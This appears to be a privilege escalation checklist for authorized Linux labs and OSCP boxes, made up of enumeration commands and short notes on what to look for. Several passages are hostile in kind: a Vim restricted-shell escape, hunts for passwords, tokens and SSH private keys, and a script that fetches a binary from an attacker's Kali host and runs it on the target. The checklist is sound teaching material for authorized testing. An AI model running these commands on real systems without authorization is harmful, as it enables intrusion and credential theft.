---
title: Linux privilege escalation checklist
description: A fast, command-first Linux privilege escalation checklist for authorized labs and OSCP boxes.
outline: [2, 3]
pageClass: field-page
prev: false
next: false
---

# Linux privilege escalation

Use this beside the target Bash shell. Stop when you find a credible lead and open the
linked task only when it needs a deeper procedure.

> [!IMPORTANT]
> Authorized labs only. Start with scoped checks; widen only when needed.

## Before you start

Check where you landed and what is already in your home directory.

```bash
pwd
ls -la ~
```

Commands using `-xdev` stay on the named filesystem. If `findmnt` shows a
relevant separate mount, rerun the check from that mount.

If you landed as an application account such as `www-data`, look for readable
application configuration and credentials that can move you to a normal user.
Interactive users and their home directories are covered in the next section.

Search common locations for a known filename first:

```bash
find /home /opt /var/www /srv -name '<NAME>' -ls 2>/dev/null
```

Widen the search only if those locations are insufficient:

```bash
find / -name '<NAME>' -ls 2>/dev/null
```

If the shell is restricted and Vim or Vi is available, try this inside the
editor:

```vim
:set shell=/bin/bash
:shell
```

**Look for:** unexpected files in your home directory, application credentials,
or a less restricted shell running as the same user.

**If found:** verify it with `id`, then continue at the matching section. For
shell-boundary details, open
[LNX-01](../generated/tasks/lnx-01) or
[SHELL-02](../generated/tasks/shell-02).

## Identity and sudo

```bash
whoami
id
groups
sudo -n -l
uname -a
getent group sudo wheel docker lxd disk adm shadow 2>/dev/null
```

If nonblocking sudo reports that a password is required and you have the
current user's supplied password, run `sudo -l` once with its normal prompt.

Group output uses `group:password-placeholder:GID:members`.

**Look for:** delegated commands, unusual run-as users, and membership in
`docker`, `lxd`, `disk`, `adm`, `shadow`, `sudo`, or `wheel`.

**If found:** keep the complete rule and investigate that binary or group. See
[LNX-03](../generated/tasks/lnx-03).

## Users and home directories

```bash
cat /etc/passwd
grep -E '/bin/(bash|sh|zsh)$' /etc/passwd
ls -la /home
who
w
last -n 20
find /home -maxdepth 3 -type f -readable -ls 2>/dev/null
```

**Look for:** interactive users, active sessions, readable history or
configuration belonging to another user, and names reused by applications.

**If found:** inspect files tied to that user or application. See
[LNX-07](../generated/tasks/lnx-07).

## SUID and SGID

```bash
find / -xdev -type f \( -perm -4000 -o -perm -2000 \) -ls 2>/dev/null
```

**Look for:** nonstandard binaries, GTFOBins matches, relative command
execution, writable scripts or configuration, and PATH lookups.

**If found:** record its path and permissions. Continue with
[LNX-05](../generated/tasks/lnx-05) or a matching procedure such as
[LPRIV-02](../generated/tasks/lpriv-02).

## Linux capabilities

```bash
getcap -r /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin /opt 2>/dev/null
```

This covers the usual executable locations without walking virtual filesystems.
Run `getcap -r '<RELEVANT_MOUNT_OR_DIRECTORY>'` only when another path matters.

**Look for:** `cap_setuid`, `cap_setgid`, `cap_dac_override`,
`cap_dac_read_search`, and `cap_sys_admin` on unexpected executables.

**If found:** inspect it with `stat`, `file`, and `getcap -v`. See
[LPRIV-04](../generated/tasks/lpriv-04).

## Cron jobs and timers

```bash
cat /etc/crontab
ls -la /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
SYSTEMD_PAGER=cat systemctl list-timers --all --no-pager 2>/dev/null
crontab -l 2>/dev/null
find /etc/cron* -type f -ls 2>/dev/null
```

**Look for:** root-owned jobs that call writable scripts, wildcard expansion,
relative paths, writable working directories, or commands that are not absolute.

**If found:** confirm the execution user and trigger before editing. See
[LNX-06](../generated/tasks/lnx-06) and
[LPRIV-03](../generated/tasks/lpriv-03).

## Process monitoring with pspy

Run `uname -m` on the target first; `pspy64` is for x86-64. Prepare pspy on
Kali, not on the target. Look for a copy you already have:

```bash
find /usr/share/pspy "$PWD" -maxdepth 2 -type f -name 'pspy64*' -ls 2>/dev/null
```

If no copy exists and the lab rules and Kali internet access permit a download:

```bash
wget 'https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64' -O pspy64
chmod +x pspy64
```

Choose an unused unprivileged port and the Kali interface reachable from the
target. Serve only the binary's directory:

```bash
ip -br -4 addr
ss -lnt
python3 -m http.server '<PORT>' --bind '<KALI_IP>' --directory '<DIRECTORY_WITH_PSPY>'
```

In the target shell, choose a writable directory on a mount without `noexec`.
This transfer uses the first available client:

```bash
url='http://<KALI_IP>:<PORT>/<PSPY_FILENAME>'
dst=$(mktemp '<TARGET_TRANSFER_DIRECTORY>/pspy.XXXXXX') || exit 1
if command -v curl >/dev/null 2>&1; then
  curl -fL "$url" -o "$dst"
elif command -v wget >/dev/null 2>&1; then
  wget "$url" -O "$dst"
elif command -v python3 >/dev/null 2>&1; then
  URL="$url" DST="$dst" python3 -c \
    'import os, urllib.request; urllib.request.urlretrieve(os.environ["URL"], os.environ["DST"])'
else
  printf 'No curl, wget, or python3; use an allowed transfer method.\n' >&2
  rm -f -- "$dst"
  exit 1
fi
[ -s "$dst" ] || { rm -f -- "$dst"; printf 'Transfer failed.\n' >&2; exit 1; }
chmod +x "$dst" && "$dst"
```

**Look for:** recurring root commands, scripts launched from writable paths,
and credentials passed on command lines.

**If found:** return to the matching cron, service, or writable-path section.
Press `Ctrl+C` to stop pspy, remove only the transferred target copy with
`rm -f -- "$dst"`, and press `Ctrl+C` in Kali to stop the file server.

## Writable files and directories

Check high-value files and common application locations first:

```bash
ls -la /etc/passwd /etc/shadow /etc/group /etc/sudoers /etc/crontab 2>/dev/null
find /etc /opt /usr/local /var/www /srv -xdev -type f -writable -ls 2>/dev/null
find /etc/sudoers.d -type f -ls 2>/dev/null
```

If the scoped pass finds nothing, widen the search while excluding virtual
filesystems:

```bash
find / -xdev -type f -writable -ls 2>/dev/null
find / -xdev -type d -writable -ls 2>/dev/null
```

**Look for:** files consumed by root services or jobs, replaceable parents,
application configuration, and trusted PATH directories.

**If found:** identify the privileged consumer before changing it. See
[LNX-04](../generated/tasks/lnx-04) and
[LNX-06](../generated/tasks/lnx-06).

## Processes

```bash
ps -eo user,pid,ppid,cmd --forest
ps auxww
```

**Look for:** custom root processes, credentials in arguments, unusual parent
and child relationships, and executables under `/opt`, `/srv`, `/usr/local`, or
web roots.

**If found:** inspect that executable, service, configuration, and writable paths.

## Services

```bash
SYSTEMD_PAGER=cat systemctl --type=service --state=running --no-pager --full
```

For one interesting service:

```bash
SYSTEMD_PAGER=cat systemctl show '<SERVICE>.service' --no-pager \
  -p User -p Group -p ExecStart -p FragmentPath \
  -p WorkingDirectory -p MainPID
SYSTEMD_PAGER=cat systemctl cat '<SERVICE>.service' --no-pager
```

**Look for:** root services running custom binaries, writable unit files,
writable executables, relative paths, or writable working directories.

**If found:** follow [LNX-06](../generated/tasks/lnx-06) to confirm the consumer
and trigger.

## Local listening ports

```bash
ss -lntup
```

Fallback when `ss` is unavailable:

```bash
netstat -lntup 2>/dev/null
```

**Look for:** services bound only to `127.0.0.1` or `::1`, local databases, and
ports that were not visible from Kali.

**If found:** identify the protocol and access requirements. See
[LNX-08](../generated/tasks/lnx-08).

## Shell histories and credentials

```bash
cat ~/.bash_history 2>/dev/null
cat ~/.zsh_history 2>/dev/null
cat ~/.mysql_history 2>/dev/null
cat ~/.psql_history 2>/dev/null
find /home -maxdepth 4 -type f \
  \( -name '.bash_history' \
     -o -name '.zsh_history' \
     -o -name '.mysql_history' \
     -o -name '.psql_history' \) \
  -readable -ls 2>/dev/null
```

**Look for:** passwords, reused usernames, internal hosts, database commands,
and paths to custom applications.

**If found:** follow the matching account or service lead. Verify a new shell
with `hostname`, `id`, and `pwd`.

## Configuration files and secrets

Find likely configuration and backup files in application locations:

```bash
find /var/www /opt /srv /home -xdev -type f \
  \( -name '*.conf' \
     -o -name '*.config' \
     -o -name '*.ini' \
     -o -name '.env' \
     -o -name '*.yml' \
     -o -name '*.yaml' \
     -o -name '*.bak' \
     -o -name '*.old' \
     -o -name 'wp-config.php' \
     -o -name 'config.php' \
     -o -name 'settings.php' \
     -o -name 'configuration.php' \) \
  -readable -ls 2>/dev/null
```

Search inside the most relevant application directory first:

```bash
grep -RniE 'password|passwd|secret|token|credential|api[_-]?key' '<APPLICATION_DIRECTORY>' 2>/dev/null
```

**Look for:** database credentials, service accounts, backup copies, API keys,
and hostnames that explain another local service.

**If found:** keep its source path and follow the matching service or user. See
[LNX-07](../generated/tasks/lnx-07).

## SSH keys

```bash
find /home /root /opt /var/www -xdev -type f \
  \( -name 'id_rsa' \
     -o -name 'id_ed25519' \
     -o -name 'authorized_keys' \
     -o -name '*.pem' \
     -o -name '*.key' \) \
  -ls 2>/dev/null
find /home -xdev -type d -name '.ssh' -ls 2>/dev/null
ls -la ~/.ssh 2>/dev/null
cat ~/.ssh/authorized_keys 2>/dev/null
cat ~/.ssh/known_hosts 2>/dev/null
```

**Look for:** readable private keys, reused keys, permitted users, and internal
hostnames.

**If found:** inspect permissions and fingerprint it before login. See
[SSH-01](../generated/tasks/ssh-01).

## PATH and environment hijacking

```bash
printf '%s\n' "$PATH" | tr ':' '\n'
env
cat /etc/environment 2>/dev/null
while IFS= read -r d; do
  [ -n "$d" ] || d=.
  ls -ld -- "$d" 2>/dev/null
done < <(printf '%s' "$PATH" | tr ':' '\n')
```

**Look for:** writable PATH directories, empty PATH entries, relative commands
inside privileged scripts, and environment variables consumed by a service.

**If found:** verify that the privileged program really resolves the command
through PATH. See [LNX-09](../generated/tasks/lnx-09) and
[LPRIV-13](../generated/tasks/lpriv-13).

## Mounted filesystems

```bash
mount
findmnt
df -h
cat /etc/fstab
```

**Look for:** writable unusual mounts, credentials in `/etc/fstab`, network
filesystems, removable storage, and mount options that affect SUID or execution.

**If found:** inspect the exact mount and its ownership before treating it as a
privilege path.

## NFS

```bash
cat /etc/exports 2>/dev/null
exportfs -v 2>/dev/null
```

**Look for:** exported writable paths and `no_root_squash`.

**If found:** verify the export from Kali or another permitted client context;
`showmount -e '<TARGET_IP>'` can miss NFSv4-only exports. See
[NFS-01](../generated/tasks/nfs-01) for version-aware checks.

## Docker, LXD, and containers

```bash
id
command -v docker 2>/dev/null
command -v lxc 2>/dev/null
docker ps 2>/dev/null
lxc list 2>/dev/null
ls -l /var/run/docker.sock 2>/dev/null
cat /proc/$$/cgroup 2>/dev/null
```

**Look for:** Docker or LXD group membership, access to the Docker socket,
running containers, and evidence that your current root is container-only.

**If found:** distinguish container privileges from host privileges. Use
[LNX-02](../generated/tasks/lnx-02) for the boundary check.

## ACLs

Check the observed file, directory, and path chain. Avoid a recursive ACL dump:

```bash
getfacl -p '<OBSERVED_PATH>' 2>/dev/null
namei -l -- '<OBSERVED_PATH>' 2>/dev/null
```

**Look for:** named-user or named-group write access that ordinary mode bits do
not show.

**If found:** confirm whether a higher-privileged process consumes that exact
path before modifying it.

## Custom software

```bash
ls -la /opt
ls -la /usr/local/bin
ls -la /usr/local/sbin
ls -la /srv
```

**Look for:** non-package binaries, scripts, backups, writable directories,
version files, and service configuration.

**If found:** connect the software to a running process or service, then inspect
its exact version and permissions.

## Installed packages and versions

Map the executable from a real process, service, SUID, or capability lead back
to its package. Use the command for the installed package manager:

```bash
dpkg-query -S '<OBSERVED_EXECUTABLE_PATH>' 2>/dev/null
rpm -qf '<OBSERVED_EXECUTABLE_PATH>' 2>/dev/null
```

Check only server software that is present or tied to a lead:

```bash
apache2 -v 2>/dev/null
nginx -v 2>&1
mysql --version 2>/dev/null
```

**Look for:** custom or unusually old software connected to a privileged service,
not merely a long list of version numbers.

**If found:** validate its path, configuration, and execution context. See
[LNX-09](../generated/tasks/lnx-09).

## Kernel and operating system

```bash
uname -a
uname -r
cat /etc/os-release
cat /etc/issue
arch
command -v gcc
command -v cc
command -v python
command -v python3
command -v perl
```

**Look for:** architecture, available compilers or interpreters, and a kernel
version that supports a specific, independently verified lab technique.

**If found:** check the exact build and prerequisites. A version alone is not
proof that a technique applies.

## Recheck after changing user

Whenever you obtain another shell or user context, rerun the small identity set:

```bash
hostname
id
groups
pwd
sudo -n -l
```

Do not restart the entire enumeration pass unless you lost the earlier results.

**Look for:** new groups, sudo rules, readable files, and previously blocked paths.

**If found:** revisit only the section affected by the changed identity. See
[LNX-10](../generated/tasks/lnx-10).

